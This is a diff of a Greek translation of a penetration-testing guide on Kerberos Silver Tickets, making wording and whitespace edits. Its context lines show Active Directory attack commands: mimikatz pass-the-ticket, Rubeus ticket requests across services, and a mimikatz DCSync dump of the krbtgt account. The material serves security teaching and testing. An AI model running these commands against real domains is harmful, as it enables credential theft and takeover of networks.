@@ -57,14 +57,14 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 | Προγραμματισμένα Καθήκοντα                | HOST                                                                  |
 | Κοινή Χρήση Αρχείων Windows, επίσης psexec | CIFS                                                                  |
 | Λειτουργίες LDAP, συμπεριλαμβανομένου του DCSync | LDAP                                                                  |
-| Εργαλεία Διαχείρισης Απομακρυσμένου Διακομιστή Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                    |
+| Εργαλεία Διαχείρισης Απομακρυσμένου Διακομιστή Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                   |
 | Χρυσά Εισιτήρια                            | krbtgt                                                                |
 
 Χρησιμοποιώντας **Rubeus** μπορείτε να **ζητήσετε όλα** αυτά τα εισιτήρια χρησιμοποιώντας την παράμετρο:
 
 * `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### IDs Γεγονότων Silver Tickets
+### IDs Εκδηλώσεων Silver tickets
 
 * 4624: Σύνδεση Λογαριασμού
 * 4634: Αποσύνδεση Λογαριασμού
@@ -138,7 +138,7 @@ New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 
 ### LDAP
 
-Με αυτό το προνόμιο μπορείτε να εξάγετε τη βάση δεδομένων του DC χρησιμοποιώντας **DCSync**:
+Με αυτό το δικαίωμα μπορείτε να εξάγετε τη βάση δεδομένων του DC χρησιμοποιώντας **DCSync**:
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
